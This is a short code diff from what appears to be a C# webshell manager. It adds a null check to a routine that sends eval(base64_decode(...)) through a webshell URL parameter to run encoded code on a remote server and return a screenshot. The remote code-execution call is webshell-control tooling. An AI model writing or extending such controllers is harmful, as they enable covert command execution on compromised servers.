@@ -161,6 +161,7 @@ namespace webshellManager
         {
             String result=client.DownloadString(this.URL + "?" + this.variable + "=eval(base64_decode(\"" + SCREENSHOT + "\"));");
             MatchCollection matchedColumns = Regex.Matches(result, "-itm-(.*?)-itm-");
+            if (matchedColumns.Count == 0) return null;
             byte[] imageBytes = Convert.FromBase64String(matchedColumns[0].Groups[1].Value);
             using (var ms = new MemoryStream(imageBytes, 0, imageBytes.Length))
             {
